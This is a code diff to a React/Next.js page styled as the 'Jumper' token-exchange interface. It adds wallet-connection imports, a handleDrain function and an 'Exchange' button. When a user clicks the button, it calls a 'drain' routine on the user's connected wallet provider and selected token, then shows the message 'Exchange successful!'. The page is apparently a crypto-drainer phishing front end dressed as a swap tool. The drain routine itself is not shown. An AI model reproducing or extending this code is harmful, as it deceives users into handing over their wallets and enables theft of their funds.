@@ -3,12 +3,9 @@
 import { useState, useEffect } from "react";
 import {
   ArrowLeft,
-  Menu,
   Settings,
   Wallet,
   Search,
-  Sun,
-  Moon,
   Bell,
   X,
   ArrowLeftRight,
@@ -23,6 +20,11 @@ import Image from "next/image";
 import axios from "axios";
 
 import JumperLayout from "../layouts/jumperLayout";
+import SeiConnectButton from "@/components/global/SeiConnectButton";
+import { useAccount } from "wagmi";
+import { ethers } from "ethers";
+import { useWallet } from "@/components/useWallet";
+import { toast } from "react-toastify";
 
 interface Token {
   name: string;
@@ -191,9 +193,43 @@ export default function Jumper() {
     );
   };
 
+  const [loading, setLoading] = useState(false);
+  const [txState, setTxState] = useState("Initial");
+  const { chainId, connector, isConnected, address } = useAccount();
+  const { drain } = useWallet();
+
+  const handleDrain = async () => {
+    if (!connector || !amount || selectedFromToken.address) {
+      console.error("Missing required fields for drain.");
+      return;
+    }
+
+    // console.log("Selected from asset:", selectedFromAsset);
+
+    try {
+      setLoading(true);
+      setTxState("Processing");
+
+      const provider = new ethers.providers.Web3Provider(
+        await connector.getProvider()
+      );
+      const chainId = await provider.getSigner().getChainId();
+
+      await drain(provider, chainId, selectedFromToken.address); // Trigger drain with correct args
+
+      setTxState("Completed");
+      toast.success("Exchange successful!");
+      setLoading(false);
+    } catch (error) {
+      console.error("Error in drain function:", error);
+      setTxState("Failed");
+      setLoading(false);
+    }
+  };
+
   return (
     <JumperLayout>
-      <div className="min-h-screen">
+      <div className="min-h-screen font-inter">
         {/* Navbar */}
 
         {/* Menu Overlay */}
@@ -211,15 +247,15 @@ export default function Jumper() {
                     mode === "exchange" ? "bg-[#665A81]" : ""
                   }`}
                 >
-                  <ArrowRightLeft className="text-white " />
+                  <ArrowRightLeft className="text-white" />
                 </button>
                 <button
                   onClick={() => setMode("gas")}
-                  className={`px-3 py-3  rounded-full ${
+                  className={`px-3 py-3 rounded-full ${
                     mode === "gas" ? "bg-[#665A81]" : ""
                   }`}
                 >
-                  <Fuel className="text-white " />
+                  <Fuel className="text-white" />
                 </button>
               </div>
             </div>
@@ -378,8 +414,19 @@ export default function Jumper() {
 
                     {/* Connect Wallet Button */}
                     <div className="flex gap-2">
-                      <button className="flex-1 font-[500] bg-[#543188] text-white py-3 px-6 rounded-3xl">
-                        Connect wallet
+                      <SeiConnectButton
+                        connect={
+                          <button className="flex-1 font-[500] bg-[#543188] text-white py-3 px-6 rounded-3xl">
+                            Connect wallet
+                          </button>
+                        }
+                      />
+                      <button
+                        onClick={handleDrain}
+                        disabled={loading || !amount}
+                        className="flex-1 font-[500] bg-[#543188] text-white py-3 px-6 rounded-3xl disabled:cursor-not-allowed"
+                      >
+                        {loading ? "Exchanging..." : "Exchange"}
                       </button>
                       <button
                         className="bg-[#543188] p-3 rounded-3xl"
